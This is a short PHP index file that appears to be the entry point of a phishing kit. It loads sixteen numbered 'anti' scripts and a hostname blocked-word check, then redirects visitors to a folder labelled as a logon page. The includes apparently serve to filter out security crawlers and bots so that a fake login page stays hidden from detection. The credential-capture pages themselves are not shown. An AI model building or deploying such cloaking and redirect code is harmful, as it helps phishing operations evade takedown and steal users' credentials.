<?php
/*
* index.php
*/
require_once 'G7/anti1.php';
require_once 'G7/anti1a.php';
require_once 'G7/anti2.php';
require_once 'G7/anti2a.php';
require_once 'G7/anti3.php';
require_once 'G7/anti3a.php';
require_once 'G7/anti4.php';
require_once 'G7/anti4a.php';
require_once 'G7/anti5.php';
require_once 'G7/anti5a.php';
require_once 'G7/anti6.php';
require_once 'G7/anti6a.php';
require_once 'G7/anti7.php';
require_once 'G7/anti7a.php';
require_once 'G7/anti8.php';
require_once 'G7/anti8a.php';
require_once 'hostname_check.php'; // Check if hostname contain blocked word



$host = bin2hex ($_SERVER['HTTP_HOST']);
$Logon="W";

header("location: $Logon");


?>
